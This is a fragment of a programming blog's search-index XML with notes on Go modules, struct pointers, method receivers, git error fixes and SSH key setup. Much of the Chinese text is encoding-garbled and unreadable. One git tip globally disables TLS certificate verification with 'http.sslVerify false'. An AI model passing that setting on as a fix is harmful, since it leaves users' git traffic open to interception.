class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä» GOPATH åˆ° Go modules</title>
      <link href="/blog/2022/02/26/programming/go/go_path_module/"/>
      <url>/blog/2022/02/26/programming/go/go_path_module/</url>
      
        <content type="html"><![CDATA[<p>ä¸ºäº†è§£å†³ GOPATH çš„é—®é¢˜ï¼Œå®˜æ–¹åœ¨ 1.11 å¼€å§‹æ¨å‡ºäº† Go Modulesçš„åŠŸèƒ½,å°†ç¬¬ä¸‰æ–¹åº“å‚¨å­˜åœ¨æœ¬åœ°çš„ç©ºé—´ï¼Œå¹¶ä¸”ç»™ç¨‹åºå»å¼•ç”¨ã€‚</p><p>é¦–å…ˆè¦è®¾å®š <code>GO111MODULE</code>ç¯å¢ƒå˜é‡ï¼Œæ€»å…±å¯ä»¥ä¸‰ç§ä¸åŒçš„å€¼ï¼š</p><ol type="1"><li>auto go å‘½ä»¤ä¼šæ ¹æ®å½“å‰ç›®å½•æ¥å†³å®šæ˜¯å¦å¯ç”¨ modules åŠŸèƒ½ã€‚éœ€è¦æ»¡è¶³ä¸¤ç§æƒ…å½¢ï¼š<ol type="1"><li>è¯¥é¡¹ç›®ç›®å½•ä¸åœ¨ <code>GOPATH/src/</code> ä¸‹</li><li>å½“å‰æˆ–ä¸Šä¸€å±‚ç›®å½•å­˜åœ¨ <code>go.mod</code></li></ol></li><li>on Go 1.16.6 çš„é»˜è®¤å€¼ï¼Œgo å‘½ä»¤ä¼šä½¿ç”¨ modulesï¼Œè€Œä¸ä¼š GOPATHç›®å½•ä¸‹æŸ¥æ‰¾ã€‚</li><li>off go å‘½ä»¤å°†ä¸ä¼šæ”¯æŒ module åŠŸèƒ½ï¼Œå¯»æ‰¾å¥—ä»¶å¦‚ä»¥å‰ GOPATHçš„åšæ³•å»å¯»æ‰¾ã€‚</li></ol><p>å®˜æ–¹ä¸å®è·µéƒ½æ¨èé‡‡ç”¨ Go Modules çš„åšæ³•ï¼Œä¸å†ä½¿ç”¨ GOPATHçš„åŠŸèƒ½äº†ï¼Œå› æ­¤å°†å…¶è®¾å®šä¸º onã€‚</p><p>Go Modules æ–¹å¼ä¸‹è½½ä¸‹æ¥çš„ç¬¬ä¸‰æ–¹åº“ä½åœ¨ <code>GOPATH/pkg/mod</code>æ–‡ä»¶å¤¹é‡Œé¢ã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://medium.com/%E4%BC%81%E9%B5%9D%E4%B9%9F%E6%87%82%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88/golang-goroot-gopath-go-modules-%E4%B8%89%E8%80%85%E7%9A%84%E9%97%9C%E4%BF%82%E4%BB%8B%E7%B4%B9-d17481d7a655">Golangâ€” GOROOTã€GOPATHã€Go-Modules-ä¸‰è€…çš„å…³ç³»ä»‹ç» | by é™ˆå† äº¿ Kenny |ä¼é¹…ä¹Ÿæ‡‚ç¼–ç¨‹ | Medium</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pointers to structs</title>
      <link href="/blog/2022/02/20/programming/go/point_struct/"/>
      <url>/blog/2022/02/20/programming/go/point_struct/</url>
      
        <content type="html"><![CDATA[<p>Struct fields can be accessed through a struct pointer.</p><p>To access the field X of a struct when we have the struct pointer pwe could write <code>(*p).X</code>. However, that notation iscumbersome, so the language permits us instead to write just p.X,without the explicit dereference.</p><h2 id="functions">functions</h2><p>Named return values Go's return values may be named. If so, they aretreated as variables defined at the top of the function.</p><h2 id="å¯¼å‡ºå">å¯¼å‡ºå</h2><p>Exported names: In Go, a name is exported if it begins with a capitalletter. For example, Pizza is an exported name, as is Pi, which isexported from the math package.</p><p>When importing a package, you can refer only to its exported names.Any "unexported" names are not accessible from outside the package.</p><h3 id="åˆ†å·è‡ªåŠ¨æ’å…¥è§„åˆ™">åˆ†å·è‡ªåŠ¨æ’å…¥è§„åˆ™</h3><p>æ³¨æ„ä½¿ç”¨ go.fmtè¿›è¡Œæ ¼å¼åŒ–ï¼ŒæŒ‰ç…§è¯­æ³•æ ¼å¼å†™ï¼Œå¦åˆ™ä¼šæœ‰æ„æ–™ä¹‹å¤–çš„ç»“æœã€‚</p><p><ahref="https://blog.csdn.net/s13335358730/article/details/103654224">Goè¯­è¨€å°ç»†èŠ‚â€”â€”åˆ†å·è‡ªåŠ¨æ’å…¥è§„åˆ™_s13335358730 çš„åšå®¢-CSDN åšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Golang functions and methods</title>
      <link href="/blog/2022/02/16/programming/go/func_method/"/>
      <url>/blog/2022/02/16/programming/go/func_method/</url>
      
        <content type="html"><![CDATA[<p>You can only declare a method with a receiver whose type is definedin the same package as the method. You cannot declare a method with areceiver whose type is defined in another package (which includes thebuilt-in types such as int). ä¸èƒ½å®šä¹‰åŸç”Ÿç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡ typeå®šä¹‰åˆ«åçš„æ–¹å¼æ¥å®šä¹‰åŸç”Ÿç±»å‹çš„æ–¹æ³•ã€‚</p><h2 id="receiver">receiver</h2><p>å¸¦æœ‰å€¼æ¥æ”¶å™¨çš„æ–¹æ³•ä¿®æ”¹çš„æ˜¯æ¥æ”¶å™¨çš„æ‹·è´ï¼Œå¸¦æœ‰æŒ‡é’ˆæ¥æ”¶å™¨çš„æ–¹æ³•æ‰èƒ½ä¿®æ”¹è¯¥æ¥æ”¶å™¨æœ¬èº«çš„å€¼ã€‚</p><p>Methods with pointer receivers can <strong>modify the value to whichthe receiver points</strong> (as Scale does here). Since methods oftenneed to modify their receiver, pointer receivers are more common thanvalue receivers.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Vertex)</span></span> Scale(f <span class="type">float64</span>) &#123;</span><br><span class="line">v.X = v.X * f</span><br><span class="line">v.Y = v.Y * f</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">v := Vertex&#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">v.Scale(<span class="number">10</span>)</span><br><span class="line">fmt.Println(v.Abs())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="function-and-methods">function and methods</h2><p>functions with a pointer argument must take a pointerï¼ŒFunctions thattake a value argument must take a value.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v Vertex</span><br><span class="line">ScaleFunc(v, <span class="number">5</span>)  <span class="comment">// Compile error!</span></span><br><span class="line">ScaleFunc(&amp;v, <span class="number">5</span>) <span class="comment">// OK</span></span><br></pre></td></tr></table></figure><p>while methods with pointer receivers take either a value or a pointeras the receiver when they are called. Methods with value receivers takeeither a value or a pointer as the receiver when they are called</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v Vertex</span><br><span class="line">v.Scale(<span class="number">5</span>)  <span class="comment">// OK</span></span><br><span class="line">p := &amp;v</span><br><span class="line">p.Scale(<span class="number">10</span>) <span class="comment">// OK</span></span><br></pre></td></tr></table></figure><p>For the statementÂ <code>v.Scale(5)</code>, eventhoughÂ <code>v</code>Â is a value and not a pointer, the method with thepointer receiver is called automatically. That is, as a convenience, Gointerprets thestatementÂ <code>v.Scale(5)</code>Â asÂ <code>(&amp;v).Scale(5)</code>Â sincetheÂ <code>Scale</code>Â method has a pointer receiver.</p><h2 id="two-reasons-to-use-a-pointer-receiver.">Two reasons to use apointer receiver.</h2><p>The first is so that the method can modify the value that itsreceiver points to.</p><p>The second is to avoid copying the value on each method call. Thiscan be more efficient if the receiver is a large struct, forexample.</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git é—®é¢˜æ±‡æ€»</title>
      <link href="/blog/2022/02/16/linux/git/git_issues/"/>
      <url>/blog/2022/02/16/linux/git/git_issues/</url>
      
        <content type="html"><![CDATA[<h2 id="how-to-uncommit">How to uncommit</h2><p>In the simplest terms: <code>git reset --soft comm_hash_id</code>,comm_hash_id é€šè¿‡ git log æŸ¥çœ‹,ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>HEAD</code>,<code>HEAD^</code> æ¥å¿«æ·ä»£æ›¿</p><p><code>--soft</code>: uncommit changes, <strong>changes are leftstaged</strong> (index). <code>--mixed</code> (default):<strong>uncommit + unstage</strong> changes, changes <strong>are left inworking tree</strong>. <code>--hard</code>: <strong>uncommit + unstage +delet</strong>e changes, nothing left.</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><ahref="https://stackoverflow.com/questions/3528245/whats-the-difference-between-git-reset-mixed-soft-and-hard">versioncontrol - What's the difference between git reset --mixed, --soft, and--hard? - Stack Overflow</a></li><li><ahref="https://stackoverflow.com/questions/2845731/how-to-uncommit-my-last-commit-in-git">undo- How to uncommit my last commit in Git - Stack Overflow</a></li></ol><h2 id="ä½¿ç”¨-ssh-çš„æ–¹å¼è¿›è¡Œ-clone-æˆ–è€…-push-æ—¶æŠ¥é”™">ä½¿ç”¨ ssh çš„æ–¹å¼è¿›è¡Œclone æˆ–è€… push æ—¶æŠ¥é”™</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh: connect to host github.com port 22: Connection refused</span><br><span class="line">fatal: Could not read from remote repository.</span><br><span class="line">Please make sure you have the correct access rights and the repository exists.</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repository access denied.</span><br></pre></td></tr></table></figure><p>åŸå› ï¼šåœ¨æ²¡æœ‰é…ç½® ssh å¯†é’¥çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨ sshåè®®å…‹éš†ä»“åº“æ˜¯ä¸å¯è¡Œçš„ï¼Œ</p><p>è§£å†³åŠæ³•ï¼š</p><ol type="1"><li>æ”¹ç”¨ https åè®®çš„é“¾æ¥å…‹éš†ä»“åº“</li><li>é…ç½® ssh å¯†é’¥ä¹‹åå†ä½¿ç”¨ ssh åè®®</li></ol><p>æœ‰æ—¶å€™ github è¢«å±è”½ï¼Œä¹Ÿä¼šæœ‰è¿™ç§ç±»ä¼¼æŠ¥é”™ï¼Œssh è¢«é˜»æ–­äº†ï¼ŒæŒ‚æ¢¯å­</p><h2 id="git-å°†é»˜è®¤åˆ†æ”¯ç”±-master-æ”¹ä¸ºäº†-mainå¯¼è‡´æŠ¥é”™">Git å°†é»˜è®¤åˆ†æ”¯ç”±master æ”¹ä¸ºäº† mainï¼Œå¯¼è‡´æŠ¥é”™</h2><p>github åœ¨ 2020/10/1å®£å¸ƒæ‰€æœ‰æ–°åº“éƒ½å°†ç”¨ä¸­æ€§è¯ã€Œmainã€å‘½å,å–ä»£åŸæ¥çš„ã€Œmasterã€</p><p>æœ€æ–° git å»ºä»“åº“å¹¶ä¹ æƒ¯æ€§ä½¿ç”¨ master æ¥ push çš„æ—¶å€™ï¼ŒæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">error: src refspec master does not match any</span><br><span class="line">error: failed to push some refs to &#x27;https://github.com/realyee/codesnippet.git&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼š</p><ol type="1"><li><p>å°†åˆ†æ”¯ check out åˆ° masterï¼Œç„¶å push</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b master</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure></p></li><li><p>ä¸æŒ‡åå½“å‰åˆ†æ”¯ï¼Œåªè¯´å°† local red HEAD æ¨é€åˆ°è¿œç«¯çš„ master</p><p><code>git push origin HEAD:master</code></p></li></ol><h3 id="å‚è€ƒèµ„æ–™-1">å‚è€ƒèµ„æ–™</h3><ol type="1"><li><ahref="https://stackoverflow.com/questions/4181861/message-src-refspec-master-does-not-match-any-when-pushing-commits-in-git">Message'src refspec master does not match any' when pushing commits in Git -Stack Overflow</a></li></ol><h2 id="git-push-gnutls-recv-error--110-the-tls-æŠ¥é”™">git push GnuTLSrecv error (-110): The TLS æŠ¥é”™</h2><p>this solution below worked for me</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gnutls-bin</span><br><span class="line">git config --global http.sslVerify false</span><br><span class="line">git config --global http.postBuffer 1048576000</span><br></pre></td></tr></table></figure><p><a href="https://github.com/argoproj/argo-cd/issues/3994">GnuTLS recverror (-110): The TLS connection was non-properly terminated Â· Issue#3994 Â· argoproj/argo-cd Â· GitHub</a></p><h1id="go-getgit-libressl-ssl_connect-ssl_error_syscall-in-connection-to-github.com443">goget/git LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection togithub.com:443</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset https.proxy</span><br><span class="line">git config --global --unset http.proxy</span><br></pre></td></tr></table></figure><h2 id="git-push-require-username-password">git push require usernamepassword</h2><p>A common cause is cloning using the default (HTTPS) instead of SSH.You can correct this by going to your repository, clicking "Clone ordownload", then clicking the "Use SSH" button above the URL field andupdating the URL of your origin remote like this:</p><p><code>git remote set-url origin git@github.com:username/repo.git</code></p><p>You can check if you have added the remote as HTTPS or SSH using:</p><p><code>git remote -v</code></p><p>æ³¨æ„ï¼šclone çš„æ—¶å€™ä½¿ç”¨ https è¿˜æ˜¯ ssh æ˜¯æœ‰åŒºåˆ«çš„ã€‚ clone è‡ªå·±çš„ä»“åº“ç”¨sshï¼Œ clone åˆ«äººçš„ä»“åº“ç”¨ httpsï¼Œå› ä¸ºæƒé™ä¸åŒï¼Œ clone è‡ªå·±ä»“åº“çš„ httpsç‰ˆæœ¬å¦‚æœ push çš„è¯éœ€è¦æä¾›ç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œ gitç°åœ¨ç‰ˆæœ¬ä¸å†æ”¯æŒè¯¥æ–¹å¼ã€‚</p><p>å‚è€ƒï¼š<ahref="https://stackoverflow.com/questions/6565357/git-push-requires-username-and-password">github- Git push requires username and password - Stack Overflow</a></p><h2 id="ssh-è®¿é—®-github-è¶…æ—¶">ssh è®¿é—® github è¶…æ—¶</h2><p><code>ssh: connect to host Build software better, together port 22: Connection timed out</code>åœ¨ fork äº†åˆ«äººçš„ä»“åº“ï¼Œclone åˆ°æœ¬åœ°ä¿®æ”¹ä¹‹åï¼Œpushä¸ä¸Šå»äº†ï¼Œæœ¬æ¥ä»¥ä¸ºç½‘ç»œæˆ–è€…ä»£ç†é—®é¢˜ï¼Œä½†æäº†åŠå¤©éƒ½ä¸è¡Œï¼Œæœ€åè§£å†³äº†ï¼šæ–¹æ³•ï¼šSwitching remote URLs from SSH to HTTPSï¼Œä» SSH åè®®ä¿®æ”¹æˆäº† HTTPSåè®®</p><p><ahref="https://docs.github.com/en/get-started/getting-started-with-git/managing-remote-repositories">Managingremote repositories - GitHub Docs</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH é…ç½®ä¸è¿œç¨‹ä»“åº“è¿æ¥</title>
      <link href="/blog/2021/10/16/linux/git/git_add_repo/"/>
      <url>/blog/2021/10/16/linux/git/git_add_repo/</url>
      
        <content type="html"><![CDATA[<p>Git æ˜¯åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå®é™…ä¸­å¯ä»¥æ‰¾ä¸€å°ç”µè„‘å……å½“æœåŠ¡å™¨çš„è§’è‰²ï¼Œæ¯å¤©24å°æ—¶å¼€æœºï¼Œå…¶ä»–æ¯ä¸ªäººéƒ½ä»è¿™ä¸ªâ€œæœåŠ¡å™¨â€ä»“åº“å…‹éš†ä¸€ä»½åˆ°è‡ªå·±çš„ç”µè„‘ä¸Šï¼Œå¹¶ä¸”å„è‡ªæŠŠå„è‡ªçš„æäº¤æ¨é€åˆ°æœåŠ¡å™¨ä»“åº“é‡Œï¼Œä¹Ÿä»æœåŠ¡å™¨ä»“åº“ä¸­æ‹‰å–åˆ«äººçš„æäº¤ã€‚åˆ†å¸ƒå¼ç‰ˆæœ¬ç³»ç»Ÿçš„æœ€å¤§å¥½å¤„ä¹‹ä¸€æ˜¯å¯ä»¥ç¦»çº¿å·¥ä½œï¼Œè”ç½‘æ—¶æäº¤æ¨é€æ›´æ–°å³å¯ã€‚</p><p>How to keep your git repository private?</p><ol type="1"><li>github åˆ›å»º private ä»“åº“</li><li>è‡ªå·±åŠ¨æ‰‹ï¼Œæ­ä¸€ä¸ª Git æœåŠ¡å™¨ï¼Œå› ä¸ºæ˜¯ä½ è‡ªå·±çš„ GitæœåŠ¡å™¨ï¼Œæ‰€ä»¥åˆ«äººä¹Ÿæ˜¯çœ‹ä¸è§çš„ã€‚å…¬å¸å†…éƒ¨å¼€å‘å¿…å¤‡ã€‚</li></ol><h2 id="ssh-é…ç½®">SSH é…ç½®</h2><ol type="1"><li><p>SSH å¯†é’¥é…ç½®</p><ol type="1"><li><p>è¯»å– globalçº§åˆ«çš„é…ç½®ï¼š<code>git config --global --list</code>,æŸ¥çœ‹æ˜¯å¦è®¾ç½®username å’Œ email</p></li><li><p>ä½¿ç”¨ <code>ssh-keygen</code> ç”Ÿæˆ public/private rsa keypair.</p><p><code>ssh-keygen -t rsa -C "xxx@qq.com"</code>, åé¢çš„é‚®ç®±æ”¹æˆ githubæ³¨å†Œé‚®ç®±æ‰§è¡Œä¹‹åä¼šæç¤ºä¸€ç³»åˆ—æ“ä½œï¼Œæ³¨æ„ç¡®è®¤ç§˜é’¥çš„ä¿å­˜è·¯å¾„çš„æ—¶å€™ï¼Œæˆ‘ä¸€èˆ¬åå‘è‡ªå·±é’ˆå¯¹ç½‘ç«™ä¿®æ”¹ä¸€ä¸‹ï¼Œå¦åˆ™åç»­å¤šä¸ªssh å¯†é’¥å°±ä¸å¥½å¤„ç†äº†ã€‚</p></li><li><p>æ·»åŠ  rsa å…¬é’¥åˆ° github è¿œç¨‹ä»“åº“</p><p>github é…ç½®é¡µï¼š Settings -- SSH and GPG keys -- New SSH key,å°†æœ¬åœ°ç”Ÿæˆçš„ id_rsa.pub çš„å†…å®¹å¤åˆ¶ç²˜è´´å³å¯</p></li><li><p>æµ‹è¯•æ˜¯å¦é…ç½®æˆåŠŸ</p><p><code>ssh -T git@github.com</code></p></li></ol></li><li><p>æœ¬åœ°è®¾ç½®å¤šä¸ª ssh å¯†é’¥<strong>è§£å†³åŠæ³•å°±æ˜¯ï¼šç”Ÿæˆä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰ä¸åŒçš„å…¬ç§å¯†é’¥å¯¹ï¼Œç”¨ configæ–‡ä»¶ç®¡ç†å®ƒä»¬ã€‚</strong> åœ¨ <code>~/.ssh</code> ç›®å½•ä¸‹åˆ›å»ºåä¸º<code>config</code> çš„æ–‡ä»¶ï¼š</p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># gitee and github</span><br><span class="line"># æ³¨æ„ï¼šå¤šä¸ªHostå…¬ç”¨ä¸€ä¸ªå…¬é’¥æ—¶ï¼Œ</span><br><span class="line"># å¯¹åº”çš„HostNameå’ŒPortå¿…é¡»è·Ÿåœ¨Hoståé¢</span><br><span class="line">    Host gitee.com</span><br><span class="line">    HostName gitee.com</span><br><span class="line">    Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line"># gitlab.company.com</span><br><span class="line">Host gitlab.company.com</span><br><span class="line">HostName gitlab.company.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/company_rsa</span><br><span class="line"></span><br><span class="line"># å…¶ä»–çš„ç»Ÿä¸€ç”¨ id_rsa æ–‡ä»¶ç™»é™†ï¼Œæˆ–è€…å¯†ç ã€‚</span><br><span class="line"># æ³¨æ„ï¼šè¿™é‡Œçš„ç¬¬äºŒè¡Œåé¢æœ‰ä¸ª passwordï¼Œå°±æ˜¯åŒæ—¶å…è®¸å¯†ç ç™»é™†</span><br><span class="line"># ä¸ç„¶ç¬¬ä¸€æ¬¡æ²¡åŠ å…¬é’¥ï¼Œå¯†ç ä¹Ÿç™»é™†ä¸äº†ï¼Œä¼šæç¤ºé”™è¯¯ï¼šPermission denied (publickey,password).</span><br><span class="line">Host *</span><br><span class="line">PreferredAuthentications publickey,password</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://www.awaimai.com/2200.html">git é…ç½®å¤šä¸ªSSH Key</a></p></li></ol><h2 id="æœ¬åœ°ä»£ç çº³å…¥-git-ç®¡ç†å¹¶ä¸Šä¼ è‡³-github">æœ¬åœ°ä»£ç çº³å…¥ gitç®¡ç†ï¼Œå¹¶ä¸Šä¼ è‡³ github</h2><ol type="1"><li><p>åœ¨ github ä¸Šæ‰‹åŠ¨åˆ›å»ºä»“åº“ï¼ˆå‡è®¾ä»“åº“åä¸ºï¼šmybackupï¼‰</p></li><li><p>åˆå§‹åŒ–æœ¬åœ°ä»“åº“</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd mybackup</span><br><span class="line">git init</span><br></pre></td></tr></table></figure></p><p><code>git init</code> å°†å½“å‰ç›®å½•å˜æˆ Git å¯ä»¥ç®¡ç†çš„ä»“åº“ï¼Œ å…·ä½“è¡¨ç°ä¸º:æ‰§è¡Œå‘½ä»¤åï¼Œåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ <code>.git</code> ç›®å½•ï¼Œæ˜¯ Gitæ¥è·Ÿè¸ªç®¡ç†ç‰ˆæœ¬åº“çš„ã€‚</p></li><li><p>æ·»åŠ æ–‡ä»¶åˆ°æš‚å­˜åŒº <code>git add -A</code> æˆ–è€…<code>git add æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</code></p></li><li><p>æäº¤åˆ°æœ¬åœ°ä»“åº“ <code>git commit -m your comment</code></p><p>-måé¢è¾“å…¥çš„æ˜¯æœ¬æ¬¡æäº¤çš„è¯´æ˜ï¼Œå¯ä»¥è¾“å…¥ä»»æ„å†…å®¹ï¼Œå½“ç„¶æœ€å¥½æ˜¯æœ‰æ„ä¹‰çš„ï¼Œè¿™æ ·ä½ å°±èƒ½ä»å†å²è®°å½•é‡Œæ–¹ä¾¿åœ°æ‰¾åˆ°æ”¹åŠ¨è®°å½•ã€‚</p></li><li><p>é…ç½®è¿œç¨‹ä»“åº“<code>git remote add origin https://github.com/YOURGITHUBID/mybackup.git</code></p></li><li><p>å°†æœ¬åœ°ä»“åº“ push åˆ°è¿œç¨‹ä»“åº“<code>git push -u origin master</code></p><p>ç”±äºè¿œç¨‹åº“æ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡æ¨é€<code>master</code>åˆ†æ”¯æ—¶ï¼ŒåŠ ä¸Šäº†<code>-u</code>å‚æ•°ï¼ŒGitä¸ä½†ä¼šæŠŠæœ¬åœ°çš„<code>master</code>åˆ†æ”¯å†…å®¹æ¨é€çš„è¿œç¨‹æ–°çš„<code>master</code>åˆ†æ”¯ï¼Œè¿˜ä¼šæŠŠæœ¬åœ°çš„<code>master</code>åˆ†æ”¯å’Œè¿œç¨‹çš„<code>master</code>åˆ†æ”¯å…³è”èµ·æ¥ï¼Œåœ¨ä»¥åçš„æ¨é€æˆ–è€…æ‹‰å–æ—¶å°±å¯ä»¥ç®€åŒ–å‘½ä»¤ã€‚</p></li></ol><h2 id="æ–°å»ºé¡¹ç›®ç›´æ¥ç”¨-git-ç®¡ç†">æ–°å»ºé¡¹ç›®ç›´æ¥ç”¨ Git ç®¡ç†</h2><p>å‡è®¾ä»£ç ä»“åº“ä»é›¶å¼€å‘ï¼Œæ­¥éª¤å¦‚ä¸‹</p><ol type="1"><li><p>github ç½‘é¡µæ–°å»ºè¿œç¨‹ä»“åº“</p></li><li><p>å¤åˆ¶ä»“åº“é“¾æ¥ï¼Œä½¿ç”¨ git clone ä»è¿œç¨‹åº“å…‹éš†</p><p>git clone æ”¯æŒé€šè¿‡ <code>https</code>ï¼Œ<code>ssh</code> ä¸¤ç§åè®®</p><p>Use a password-protected SSH key. Use Git using the web URL.</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/username/repo_name.git</span><br><span class="line">git clone git@github.com:username/repo_name.git</span><br></pre></td></tr></table></figure></p></li><li><p>å¦‚æœæœ‰å¿…è¦çš„è¯ï¼Œå¯ä»¥å†å¯¹å½“å‰çš„ä»“åº“è®¾ç½®ä¸ªäººä¿¡æ¯ã€‚</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --local user.name &quot;your_name&quot;</span><br><span class="line">git config --local user.email &quot;your_email&quot;</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„: local çš„ä¸ªäººä¿¡æ¯ä¼˜å…ˆçº§é«˜äº global çš„ä¸ªäººä¿¡æ¯ï¼Œå³:åœ¨è®¾ç½®äº†global æƒ…å†µä¸‹ï¼Œå†å¯¹æŸä¸ªä»“åº“å•ç‹¬è®¾ç½® local ä¹Ÿæ˜¯å¯ä»¥ã€‚</p></li><li><p>æŠŠæœ¬åœ°åº“çš„æ‰€æœ‰å†…å®¹æ¨é€åˆ°è¿œç¨‹åº“ä¸Šï¼š<code>git push origin master</code>æŠŠæœ¬åœ°åº“çš„å†…å®¹æ¨é€åˆ°è¿œç¨‹ï¼Œç”¨<code>git push</code>å‘½ä»¤ï¼Œå®é™…ä¸Šæ˜¯æŠŠå½“å‰åˆ†æ”¯<code>master</code>æ¨é€åˆ°è¿œç¨‹ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git ç®€ä»‹, é…ç½®ä¸åŸºæœ¬åŸç†</title>
      <link href="/blog/2021/09/16/linux/git/git_basic/"/>
      <url>/blog/2021/09/16/linux/git/git_basic/</url>
      
